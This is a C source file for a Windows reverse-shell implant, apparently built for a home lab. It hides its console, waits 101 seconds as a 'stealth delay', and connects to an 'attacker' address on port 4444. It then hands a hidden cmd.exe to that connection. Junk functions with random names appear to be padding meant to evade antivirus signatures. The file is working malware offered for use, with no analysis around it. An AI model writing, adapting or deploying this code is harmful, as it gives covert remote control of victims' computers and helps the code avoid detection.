
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")


void eVQEVHqP() {
    int x = 464;
    int y = 320;
    if (x + y > 2000) { printf("%d", x); }
}


void KcWyhlNs() {
    int x = 52;
    int y = 391;
    if (x + y > 2000) { printf("%d", x); }
}


void GRdnEAWs() {
    int x = 931;
    int y = 906;
    if (x + y > 2000) { printf("%d", x); }
}


void CHhSKRUv() {
    int x = 899;
    int y = 153;
    if (x + y > 2000) { printf("%d", x); }
}


void IQuSrIUT() {
    int x = 903;
    int y = 816;
    if (x + y > 2000) { printf("%d", x); }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    FreeConsole();
    // STEALTH DELAY (101 Seconds)
    Sleep(101000); 

    // WINSOCK STARTUP
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    // CREATE WINDOWS SOCKET
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    
    // This is your Mac's IP address (the Attacker)
    serv_addr.sin_addr.s_addr = inet_addr("192.168.64.1");

    // CONNECT BACK TO MAC
    if (WSAConnect(sock, (SOCKADDR*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) == 0) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        
        // Redirect the Windows CMD to the Mac terminal
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        char cmd[] = "cmd.exe"; 
        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    return 0;
}
